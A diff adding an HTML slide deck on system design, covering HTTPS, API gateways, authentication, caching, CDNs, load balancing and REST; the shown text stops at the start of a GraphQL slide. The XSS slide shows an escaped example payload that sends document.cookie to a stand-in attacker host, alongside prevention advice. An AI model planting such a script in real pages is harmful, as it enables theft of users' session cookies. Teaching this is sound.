@@ -1,0 +1,1777 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>System Design Explained - Complete Guide</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Inter', sans-serif;
+        background: #0d0d0d;
+        color: #e2e8f0;
+        min-height: 100vh;
+        overflow-x: hidden;
+      }
+
+      /* Slide Navigation */
+      .slide-nav {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        gap: 10px;
+        z-index: 1000;
+        background: rgba(0, 0, 0, 0.8);
+        padding: 15px 25px;
+        border-radius: 50px;
+        border: 1px solid #333;
+      }
+
+      .slide-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: #333;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
+
+      .slide-dot.active {
+        background: #06b6d4;
+        transform: scale(1.3);
+      }
+      .slide-dot:hover {
+        background: #0891b2;
+      }
+
+      .nav-arrows {
+        position: fixed;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 40px;
+        color: #333;
+        cursor: pointer;
+        padding: 20px;
+        z-index: 1000;
+        transition: all 0.3s;
+      }
+
+      .nav-arrows:hover {
+        color: #06b6d4;
+      }
+      .nav-prev {
+        left: 20px;
+      }
+      .nav-next {
+        right: 20px;
+      }
+
+      /* Slides Container */
+      .slides-container {
+        width: 100%;
+        height: 100vh;
+        overflow: hidden;
+      }
+
+      .slide {
+        width: 100%;
+        height: 100vh;
+        display: none;
+        padding: 60px 100px;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .slide.active {
+        display: flex;
+      }
+
+      /* Title Styles */
+      .slide-title {
+        font-size: 64px;
+        font-weight: 800;
+        color: #fff;
+        text-align: center;
+        margin-bottom: 15px;
+      }
+
+      .slide-subtitle {
+        font-size: 24px;
+        color: #64748b;
+        text-align: center;
+        margin-bottom: 50px;
+      }
+
+      .cyan-underline {
+        display: block;
+        width: 250px;
+        height: 5px;
+        background: linear-gradient(90deg, #06b6d4, #22d3ee);
+        margin: 20px auto;
+        border-radius: 3px;
+      }
+
+      /* Info Box - Green Border */
+      .info-box {
+        background: rgba(6, 78, 59, 0.3);
+        border: 2px solid #10b981;
+        border-radius: 12px;
+        padding: 25px 40px;
+        text-align: center;
+        font-size: 22px;
+        color: #fff;
+        max-width: 900px;
+        margin: 30px auto;
+      }
+
+      /* Two Column Comparison */
+      .comparison-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 40px;
+        max-width: 1100px;
+        margin: 40px auto;
+      }
+
+      .benefit-box {
+        background: rgba(30, 58, 95, 0.5);
+        border: 2px solid #3b82f6;
+        border-radius: 16px;
+        padding: 30px;
+      }
+
+      .benefit-box h3 {
+        color: #fff;
+        font-size: 26px;
+        margin-bottom: 25px;
+        text-align: center;
+      }
+
+      .benefit-box li {
+        padding: 12px 0;
+        font-size: 20px;
+        color: #e2e8f0;
+        list-style: none;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .benefit-box li::before {
+        content: '●';
+        color: #3b82f6;
+        font-size: 14px;
+      }
+
+      .risk-box {
+        background: rgba(76, 29, 29, 0.5);
+        border: 2px solid #ef4444;
+        border-radius: 16px;
+        padding: 30px;
+      }
+
+      .risk-box h3 {
+        color: #f87171;
+        font-size: 26px;
+        margin-bottom: 25px;
+        text-align: center;
+      }
+
+      .risk-box li {
+        padding: 12px 0;
+        font-size: 20px;
+        color: #fca5a5;
+        list-style: none;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .risk-box li::before {
+        content: '●';
+        color: #ef4444;
+        font-size: 14px;
+      }
+
+      /* Architecture Flow */
+      .arch-flow {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 25px;
+        margin: 50px 0;
+        flex-wrap: wrap;
+      }
+
+      .arch-box {
+        background: #1a1a1a;
+        border: 2px solid #333;
+        border-radius: 12px;
+        padding: 25px 35px;
+        text-align: center;
+        min-width: 150px;
+      }
+
+      .arch-box.cyan {
+        border-color: #06b6d4;
+        background: linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(6, 182, 212, 0.05));
+      }
+      .arch-box.purple {
+        border-color: #8b5cf6;
+        background: linear-gradient(135deg, rgba(139, 92, 246, 0.15), rgba(139, 92, 246, 0.05));
+      }
+      .arch-box.blue {
+        border-color: #3b82f6;
+        background: linear-gradient(135deg, rgba(59, 130, 246, 0.15), rgba(59, 130, 246, 0.05));
+      }
+      .arch-box.orange {
+        border-color: #f59e0b;
+        background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(245, 158, 11, 0.05));
+      }
+      .arch-box.green {
+        border-color: #10b981;
+        background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(16, 185, 129, 0.05));
+      }
+      .arch-box.red {
+        border-color: #ef4444;
+        background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(239, 68, 68, 0.05));
+      }
+
+      .arch-box .icon {
+        font-size: 42px;
+        margin-bottom: 12px;
+      }
+      .arch-box .label {
+        font-size: 16px;
+        font-weight: 600;
+        color: #fff;
+      }
+
+      .arch-arrow {
+        color: #06b6d4;
+        font-size: 32px;
+      }
+
+      /* Timeline */
+      .timeline {
+        position: relative;
+        max-width: 800px;
+        margin: 40px auto;
+      }
+
+      .timeline::before {
+        content: '';
+        position: absolute;
+        left: 50%;
+        top: 0;
+        bottom: 0;
+        width: 4px;
+        background: linear-gradient(180deg, #06b6d4, #8b5cf6, #3b82f6);
+        border-radius: 4px;
+      }
+
+      .timeline-item {
+        display: flex;
+        align-items: center;
+        margin: 30px 0;
+      }
+
+      .timeline-left {
+        width: 45%;
+        text-align: right;
+        padding-right: 40px;
+      }
+
+      .timeline-right {
+        width: 45%;
+        padding-left: 40px;
+      }
+
+      .timeline-dot {
+        width: 30px;
+        height: 30px;
+        background: #10b981;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        font-size: 14px;
+        z-index: 10;
+      }
+
+      .timeline-content h4 {
+        color: #fff;
+        font-size: 22px;
+        margin-bottom: 8px;
+      }
+
+      .timeline-content p {
+        color: #64748b;
+        font-size: 16px;
+      }
+
+      /* Feature Grid */
+      .feature-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 30px;
+        max-width: 1100px;
+        margin: 40px auto;
+      }
+
+      .feature-card {
+        background: #12121a;
+        border: 1px solid #1e293b;
+        border-radius: 16px;
+        padding: 30px;
+        text-align: center;
+      }
+
+      .feature-card .icon {
+        font-size: 50px;
+        margin-bottom: 20px;
+      }
+      .feature-card h4 {
+        color: #fff;
+        font-size: 20px;
+        margin-bottom: 12px;
+      }
+      .feature-card p {
+        color: #64748b;
+        font-size: 15px;
+      }
+
+      /* Checklist */
+      .checklist {
+        max-width: 900px;
+        margin: 30px auto;
+      }
+
+      .check-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 20px;
+        padding: 20px 0;
+        border-bottom: 1px solid #1e293b;
+      }
+
+      .check-icon {
+        width: 28px;
+        height: 28px;
+        background: #06b6d4;
+        border-radius: 6px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        font-size: 16px;
+        flex-shrink: 0;
+      }
+
+      .check-text h4 {
+        color: #22d3ee;
+        font-size: 22px;
+        margin-bottom: 5px;
+      }
+
+      .check-text h4 .underline {
+        display: inline-block;
+        height: 3px;
+        background: #06b6d4;
+        margin-left: 5px;
+        width: 100px;
+      }
+
+      .check-text p {
+        color: #94a3b8;
+        font-size: 16px;
+      }
+
+      /* Key Takeaway */
+      .key-takeaway {
+        background: linear-gradient(135deg, rgba(30, 58, 95, 0.6), rgba(23, 37, 84, 0.6));
+        border: 1px solid #3b82f6;
+        border-radius: 16px;
+        padding: 35px 50px;
+        text-align: center;
+        max-width: 800px;
+        margin: 40px auto;
+      }
+
+      .key-takeaway h4 {
+        color: #22d3ee;
+        font-size: 22px;
+        margin-bottom: 15px;
+      }
+
+      .key-takeaway p {
+        color: #fff;
+        font-size: 20px;
+        font-weight: 500;
+      }
+
+      .key-takeaway .subtext {
+        color: #64748b;
+        font-size: 15px;
+        margin-top: 15px;
+      }
+
+      /* Icons Row */
+      .icons-row {
+        display: flex;
+        justify-content: center;
+        gap: 60px;
+        margin-top: 40px;
+      }
+
+      .icon-item {
+        text-align: center;
+      }
+
+      .icon-item .circle {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        margin: 0 auto 12px;
+      }
+
+      .icon-item .circle.blue {
+        background: #3b82f6;
+      }
+      .icon-item .circle.orange {
+        background: #f59e0b;
+      }
+      .icon-item .circle.green {
+        background: #10b981;
+      }
+      .icon-item .circle.purple {
+        background: #8b5cf6;
+      }
+
+      .icon-item .name {
+        color: #94a3b8;
+        font-size: 14px;
+      }
+
+      /* Vertical Timeline */
+      .v-timeline {
+        position: relative;
+        max-width: 700px;
+        margin: 30px auto;
+        padding-left: 60px;
+      }
+
+      .v-timeline::before {
+        content: '';
+        position: absolute;
+        left: 20px;
+        top: 0;
+        bottom: 0;
+        width: 3px;
+        background: #06b6d4;
+      }
+
+      .v-timeline-section {
+        padding: 25px 0;
+        border-bottom: 1px solid #1e293b;
+      }
+
+      .v-timeline-section h3 {
+        color: #fff;
+        font-size: 24px;
+        margin-bottom: 15px;
+      }
+
+      .v-timeline-item {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        padding: 10px 0;
+      }
+
+      .v-dot {
+        width: 24px;
+        height: 24px;
+        background: #10b981;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        color: #fff;
+        position: absolute;
+        left: 9px;
+      }
+
+      .v-timeline-item .icon {
+        font-size: 28px;
+      }
+      .v-timeline-item .text {
+        color: #e2e8f0;
+        font-size: 18px;
+      }
+
+      /* Full Width Diagram */
+      .full-diagram {
+        background: #0a0a0a;
+        border: 1px solid #1e293b;
+        border-radius: 20px;
+        padding: 50px;
+        max-width: 1200px;
+        margin: 30px auto;
+      }
+
+      .diagram-legend {
+        display: flex;
+        gap: 30px;
+        justify-content: flex-end;
+        margin-bottom: 30px;
+      }
+
+      .legend-item {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 14px;
+        color: #94a3b8;
+      }
+
+      .legend-line {
+        width: 30px;
+        height: 3px;
+      }
+      .legend-line.solid {
+        background: #fff;
+      }
+      .legend-line.dashed {
+        border-top: 2px dashed #ef4444;
+      }
+      .legend-box {
+        width: 20px;
+        height: 20px;
+        background: #f59e0b;
+        border-radius: 4px;
+      }
+
+      /* Fullscreen Button */
+      .fullscreen-btn {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #1e293b;
+        border: 1px solid #334155;
+        color: #fff;
+        padding: 12px 20px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 14px;
+        z-index: 1000;
+        transition: all 0.3s;
+      }
+
+      .fullscreen-btn:hover {
+        background: #06b6d4;
+      }
+
+      /* Slide Counter */
+      .slide-counter {
+        position: fixed;
+        top: 20px;
+        left: 20px;
+        color: #64748b;
+        font-size: 16px;
+        z-index: 1000;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="slide-counter"><span id="current">1</span> / <span id="total">12</span></div>
+    <button class="fullscreen-btn" onclick="toggleFullscreen()">⛶ Fullscreen</button>
+
+    <div class="nav-arrows nav-prev" onclick="prevSlide()">‹</div>
+    <div class="nav-arrows nav-next" onclick="nextSlide()">›</div>
+
+    <div class="slides-container">
+      <!-- Slide 1: Title -->
+      <div class="slide active">
+        <div class="slide-title">System Design Explained</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">The Complete Guide to Building Production-Ready Systems</div>
+
+        <div class="feature-grid" style="margin-top: 40px">
+          <div class="feature-card">
+            <div class="icon">🌐</div>
+            <h4>1. Networking</h4>
+            <p>Protocols, HTTP, HTTPS</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📡</div>
+            <h4>2. API Design</h4>
+            <p>REST, GraphQL, Gateway</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🔐</div>
+            <h4>3. Security</h4>
+            <p>Auth, Authorization, XSS</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🗄️</div>
+            <h4>4. Databases</h4>
+            <p>SQL, NoSQL, Sharding</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">⚡</div>
+            <h4>5. Performance</h4>
+            <p>Caching, CDN, Load Balancing</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🏗️</div>
+            <h4>6. Architecture</h4>
+            <p>Scaling, Microservices</p>
+          </div>
+        </div>
+
+        <div class="key-takeaway" style="margin-top: 40px">
+          <h4>🎯 What You'll Learn</h4>
+          <p>How to design systems that handle millions of requests</p>
+        </div>
+      </div>
+
+      <!-- Slide 2: HTTPS -->
+      <div class="slide">
+        <div class="slide-title">HTTPS</div>
+        <div class="slide-subtitle">HTTP + TLS/SSL Encryption</div>
+
+        <div class="info-box">Protects data in transit from eavesdropping</div>
+
+        <div class="comparison-row">
+          <div class="benefit-box">
+            <h3>Benefits</h3>
+            <ul>
+              <li>Data encryption</li>
+              <li>Data integrity</li>
+              <li>Authentication</li>
+              <li>SEO benefits</li>
+            </ul>
+          </div>
+          <div class="risk-box">
+            <h3>Risks Without HTTPS</h3>
+            <ul>
+              <li>Man-in-the-middle attacks</li>
+              <li>Data tampering</li>
+              <li>Information theft</li>
+              <li>Loss of user trust</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 3: API Gateway -->
+      <div class="slide">
+        <div class="slide-title">API Gateway</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Single Entry Point for All API Requests</div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">👤</div>
+            <div class="label">Client</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box orange">
+            <div class="icon">🚪</div>
+            <div class="label">API Gateway</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">🔧</div>
+            <div class="label">Service A</div>
+          </div>
+        </div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">🔐</div>
+            <h4>Authentication</h4>
+            <p>Validate tokens, API keys, OAuth</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🚦</div>
+            <h4>Rate Limiting</h4>
+            <p>Protect services from overload</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📊</div>
+            <h4>Monitoring</h4>
+            <p>Logging, metrics, tracing</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 4: Authentication Methods -->
+      <div class="slide">
+        <div class="slide-title">Authentication Methods</div>
+        <div class="cyan-underline"></div>
+
+        <div class="v-timeline">
+          <div class="v-timeline-section">
+            <h3>Basic Auth Methods</h3>
+            <div class="v-timeline-item">
+              <span class="icon">🔑</span><span class="text">Basic Authentication</span>
+            </div>
+            <div class="v-timeline-item">
+              <span class="icon">🔒</span><span class="text">Digest Authentication</span>
+            </div>
+            <div class="v-timeline-item"><span class="icon">🗝️</span><span class="text">API Keys</span></div>
+            <div class="v-timeline-item"><span class="icon">📋</span><span class="text">Session-based</span></div>
+          </div>
+          <div class="v-timeline-section">
+            <h3>Token-Based Auth</h3>
+            <div class="v-timeline-item"><span class="icon">🎫</span><span class="text">Bearer & JWT Tokens</span></div>
+            <div class="v-timeline-item">
+              <span class="icon">🔄</span><span class="text">Access & Refresh Tokens</span>
+            </div>
+          </div>
+          <div class="v-timeline-section">
+            <h3>OAuth2 and OIDC</h3>
+            <div class="v-timeline-item"><span class="icon">🔐</span><span class="text">OAuth2</span></div>
+            <div class="v-timeline-item"><span class="icon">🆔</span><span class="text">OpenID Connect</span></div>
+          </div>
+          <div class="v-timeline-section">
+            <h3>SSO & Identity</h3>
+            <div class="v-timeline-item">
+              <span class="icon">☁️</span><span class="text">SSO (SAML, OIDC, OAuth2)</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 5: Authorization -->
+      <div class="slide">
+        <div class="slide-title">Authorization Summary</div>
+        <div class="cyan-underline"></div>
+
+        <div class="checklist">
+          <div class="check-item">
+            <div class="check-icon">✓</div>
+            <div class="check-text">
+              <h4>What authorization is <span class="underline"></span></h4>
+              <p>Controls what users can do</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon">✓</div>
+            <div class="check-text">
+              <h4>RBAC, ABAC, ACL <span class="underline"></span></h4>
+              <p>Three main authorization models</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon">✓</div>
+            <div class="check-text">
+              <h4>Real-world examples <span class="underline"></span></h4>
+              <p>GitHub, Stripe, Firebase</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon">✓</div>
+            <div class="check-text">
+              <h4>When to use each model <span class="underline"></span></h4>
+              <p>Trade-offs and best practices</p>
+            </div>
+          </div>
+          <div class="check-item">
+            <div class="check-icon">✓</div>
+            <div class="check-text">
+              <h4>Implementation patterns <span class="underline"></span></h4>
+              <p>How to build authorization systems</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>Key Takeaway</h4>
+          <p>Each model has trade-offs</p>
+          <div class="subtext">Real systems often combine multiple models to stay flexible and secure</div>
+        </div>
+
+        <div class="icons-row">
+          <div class="icon-item">
+            <div class="circle blue">👤</div>
+            <div class="name">RBAC</div>
+          </div>
+          <div class="icon-item">
+            <div class="circle orange">🔧</div>
+            <div class="name">ABAC</div>
+          </div>
+          <div class="icon-item">
+            <div class="circle green">📋</div>
+            <div class="name">ACL</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 6: Databases -->
+      <div class="slide">
+        <div class="slide-title">Database Types</div>
+        <div class="cyan-underline"></div>
+
+        <div class="comparison-row">
+          <div class="benefit-box">
+            <h3>SQL Databases</h3>
+            <ul>
+              <li>Structured data with relationships</li>
+              <li>ACID transactions</li>
+              <li>PostgreSQL, MySQL, SQL Server</li>
+              <li>Strong consistency</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #8b5cf6; background: rgba(139, 92, 246, 0.2)">
+            <h3 style="color: #a78bfa">NoSQL Databases</h3>
+            <ul>
+              <li>Flexible schema</li>
+              <li>Horizontal scaling</li>
+              <li>MongoDB, DynamoDB, Redis</li>
+              <li>High availability</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>When to Choose?</h4>
+          <p>SQL for complex queries & transactions • NoSQL for scale & flexibility</p>
+        </div>
+      </div>
+
+      <!-- Slide 7: Caching -->
+      <div class="slide">
+        <div class="slide-title">Caching Strategies</div>
+        <div class="cyan-underline"></div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">👤</div>
+            <div class="label">Client</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box orange">
+            <div class="icon">⚡</div>
+            <div class="label">Cache</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">🗄️</div>
+            <div class="label">Database</div>
+          </div>
+        </div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">📖</div>
+            <h4>Cache-Aside</h4>
+            <p>App checks cache first, then DB</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">✍️</div>
+            <h4>Write-Through</h4>
+            <p>Write to cache and DB together</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📝</div>
+            <h4>Write-Behind</h4>
+            <p>Write to cache, async to DB</p>
+          </div>
+        </div>
+
+        <div class="info-box">Popular: Redis • Memcached • CDN Edge Cache</div>
+      </div>
+
+      <!-- Slide 8: CDN -->
+      <div class="slide">
+        <div class="slide-title">CDN</div>
+        <div class="slide-subtitle">Content Delivery Network</div>
+
+        <div class="info-box">Distributes content globally for faster delivery</div>
+
+        <div class="arch-flow">
+          <div class="arch-box green">
+            <div class="icon">🌍</div>
+            <div class="label">Origin Server</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box cyan">
+            <div class="icon">📡</div>
+            <div class="label">Edge US</div>
+          </div>
+          <div class="arch-box cyan">
+            <div class="icon">📡</div>
+            <div class="label">Edge EU</div>
+          </div>
+          <div class="arch-box cyan">
+            <div class="icon">📡</div>
+            <div class="label">Edge Asia</div>
+          </div>
+        </div>
+
+        <div class="comparison-row">
+          <div class="benefit-box">
+            <h3>Benefits</h3>
+            <ul>
+              <li>Reduced latency</li>
+              <li>Lower server load</li>
+              <li>DDoS protection</li>
+              <li>High availability</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #f59e0b; background: rgba(245, 158, 11, 0.2)">
+            <h3 style="color: #fbbf24">Popular CDNs</h3>
+            <ul>
+              <li>CloudFlare</li>
+              <li>AWS CloudFront</li>
+              <li>Akamai</li>
+              <li>Fastly</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 9: Load Balancing -->
+      <div class="slide">
+        <div class="slide-title">Load Balancing</div>
+        <div class="cyan-underline"></div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">👥</div>
+            <div class="label">Users</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box orange">
+            <div class="icon">⚖️</div>
+            <div class="label">Load Balancer</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">🖥️</div>
+            <div class="label">Server 1</div>
+          </div>
+          <div class="arch-box purple">
+            <div class="icon">🖥️</div>
+            <div class="label">Server 2</div>
+          </div>
+          <div class="arch-box purple">
+            <div class="icon">🖥️</div>
+            <div class="label">Server 3</div>
+          </div>
+        </div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">🔄</div>
+            <h4>Round Robin</h4>
+            <p>Rotate through servers equally</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📊</div>
+            <h4>Least Connections</h4>
+            <p>Route to least busy server</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📍</div>
+            <h4>IP Hash</h4>
+            <p>Same client to same server</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 10: Security - XSS -->
+      <div class="slide">
+        <div class="slide-title">7. XSS</div>
+        <div class="slide-subtitle">(Cross-Site Scripting)</div>
+
+        <div class="arch-flow">
+          <div class="arch-box blue">
+            <div class="icon">🗄️</div>
+            <div class="label">Database</div>
+          </div>
+          <div class="arch-arrow">↔</div>
+          <div class="arch-box purple">
+            <div class="icon">🖥️</div>
+            <div class="label">Server</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box cyan">
+            <div class="icon">💬</div>
+            <div class="label">Nice Picture!</div>
+          </div>
+        </div>
+
+        <div class="info-box" style="border-color: #ef4444; background: rgba(239, 68, 68, 0.2)">
+          &lt;script&gt;<br />
+          fetch('https://attacker.com/steal?c=' + document.cookie);<br />
+          &lt;/script&gt;
+        </div>
+
+        <div class="comparison-row">
+          <div class="risk-box">
+            <h3>Attack Vectors</h3>
+            <ul>
+              <li>Stored XSS in database</li>
+              <li>Reflected XSS in URLs</li>
+              <li>DOM-based XSS</li>
+              <li>Cookie theft</li>
+            </ul>
+          </div>
+          <div class="benefit-box">
+            <h3>Prevention</h3>
+            <ul>
+              <li>Input validation</li>
+              <li>Output encoding</li>
+              <li>Content Security Policy</li>
+              <li>HttpOnly cookies</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 11: Production Architecture -->
+      <div class="slide">
+        <div class="slide-title">Production Architecture</div>
+        <div class="cyan-underline"></div>
+
+        <div class="full-diagram">
+          <div class="diagram-legend">
+            <div class="legend-item">
+              <div class="legend-line solid"></div>
+              Request flow
+            </div>
+            <div class="legend-item">
+              <div class="legend-line dashed"></div>
+              Rejected requests
+            </div>
+            <div class="legend-item">
+              <div class="legend-box"></div>
+              Auth layer
+            </div>
+          </div>
+
+          <div class="arch-flow">
+            <div style="display: flex; flex-direction: column; gap: 15px">
+              <div class="arch-box cyan">
+                <div class="icon">👤</div>
+                <div class="label">User</div>
+              </div>
+              <div class="arch-box cyan">
+                <div class="icon">📱</div>
+                <div class="label">Mobile App</div>
+              </div>
+              <div class="arch-box cyan">
+                <div class="icon">☁️</div>
+                <div class="label">Third-party</div>
+              </div>
+            </div>
+            <div class="arch-arrow">→</div>
+            <div class="arch-box orange">
+              <div class="icon">🛡️</div>
+              <div class="label">Auth Server</div>
+            </div>
+            <div class="arch-arrow">→</div>
+            <div
+              style="background: rgba(59, 130, 246, 0.1); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px"
+            >
+              <div class="arch-flow" style="gap: 15px">
+                <div class="arch-box purple">
+                  <div class="icon">🚪</div>
+                  <div class="label">API Gateway</div>
+                </div>
+                <div class="arch-arrow">→</div>
+                <div class="arch-box purple">
+                  <div class="icon">💳</div>
+                  <div class="label">Payment</div>
+                </div>
+                <div class="arch-arrow">→</div>
+                <div class="arch-box blue">
+                  <div class="icon">🗄️</div>
+                  <div class="label">Database</div>
+                </div>
+              </div>
+              <div class="arch-box purple" style="margin-top: 15px">
+                <div class="icon">🔔</div>
+                <div class="label">Notification</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 12: Network Protocols -->
+      <div class="slide">
+        <div class="slide-title">Network Protocols</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">TCP • UDP • HTTP • HTTPS • WebSocket</div>
+
+        <div class="comparison-row">
+          <div class="benefit-box">
+            <h3>TCP (Transmission Control)</h3>
+            <ul>
+              <li>Reliable, ordered delivery</li>
+              <li>Connection-oriented</li>
+              <li>Error checking & recovery</li>
+              <li>Use: Web, Email, File Transfer</li>
+            </ul>
+          </div>
+          <div class="benefit-box" style="border-color: #f59e0b; background: rgba(245, 158, 11, 0.2)">
+            <h3 style="color: #fbbf24">UDP (User Datagram)</h3>
+            <ul>
+              <li>Fast, no guarantee</li>
+              <li>Connectionless</li>
+              <li>No error recovery</li>
+              <li>Use: Streaming, Gaming, DNS</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="arch-flow">
+          <div class="arch-box cyan">
+            <div class="icon">🔗</div>
+            <div class="label">HTTP/1.1</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box green">
+            <div class="icon">⚡</div>
+            <div class="label">HTTP/2</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box purple">
+            <div class="icon">🚀</div>
+            <div class="label">HTTP/3</div>
+          </div>
+          <div class="arch-arrow">→</div>
+          <div class="arch-box orange">
+            <div class="icon">🔌</div>
+            <div class="label">WebSocket</div>
+          </div>
+        </div>
+
+        <div class="key-takeaway">
+          <h4>Key Insight</h4>
+          <p>HTTP/3 uses QUIC (UDP-based) for faster connections</p>
+        </div>
+      </div>
+
+      <!-- Slide 13: HTTP vs HTTPS Deep Dive -->
+      <div class="slide">
+        <div class="slide-title">HTTP vs HTTPS</div>
+        <div class="cyan-underline"></div>
+
+        <div class="arch-flow">
+          <div class="arch-box red">
+            <div class="icon">⚠️</div>
+            <div class="label">HTTP (Port 80)</div>
+          </div>
+          <div class="arch-arrow" style="color: #64748b">vs</div>
+          <div class="arch-box green">
+            <div class="icon">🔒</div>
+            <div class="label">HTTPS (Port 443)</div>
+          </div>
+        </div>
+
+        <div class="comparison-row">
+          <div class="risk-box">
+            <h3>HTTP Problems</h3>
+            <ul>
+              <li>Data sent in plain text</li>
+              <li>No encryption</li>
+              <li>Vulnerable to MITM attacks</li>
+              <li>No data integrity</li>
+            </ul>
+          </div>
+          <div class="benefit-box">
+            <h3>HTTPS Benefits</h3>
+            <ul>
+              <li>TLS/SSL encryption</li>
+              <li>Data integrity verified</li>
+              <li>Server authentication</li>
+              <li>SEO ranking boost</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="info-box">TLS Handshake: Client Hello → Server Hello → Certificate → Key Exchange → Encrypted</div>
+      </div>
+
+      <!-- Slide 14: REST API Design -->
+      <div class="slide">
+        <div class="slide-title">REST API Design</div>
+        <div class="cyan-underline"></div>
+        <div class="slide-subtitle">Representational State Transfer</div>
+
+        <div class="feature-grid">
+          <div class="feature-card">
+            <div class="icon">📥</div>
+            <h4>GET</h4>
+            <p>Retrieve resource</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📤</div>
+            <h4>POST</h4>
+            <p>Create new resource</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">✏️</div>
+            <h4>PUT/PATCH</h4>
+            <p>Update resource</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🗑️</div>
+            <h4>DELETE</h4>
+            <p>Remove resource</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">📋</div>
+            <h4>Stateless</h4>
+            <p>No session on server</p>
+          </div>
+          <div class="feature-card">
+            <div class="icon">🔗</div>
+            <h4>Resource-based</h4>
+            <p>/users, /orders, /products</p>
+          </div>
+        </div>
+
+        <div class="info-box" style="text-align: left; font-family: monospace; font-size: 18px">
+          GET /api/users/123<br />
+          POST /api/users { "name": "John" }<br />
+          PUT /api/users/123 { "name": "Jane" }<br />
+          DELETE /api/users/123
+        </div>
+      </div>
+
+      <!-- Slide 15: GraphQL -->
+      <div class="slide">
+        <div class="slide-title">GraphQL</div>
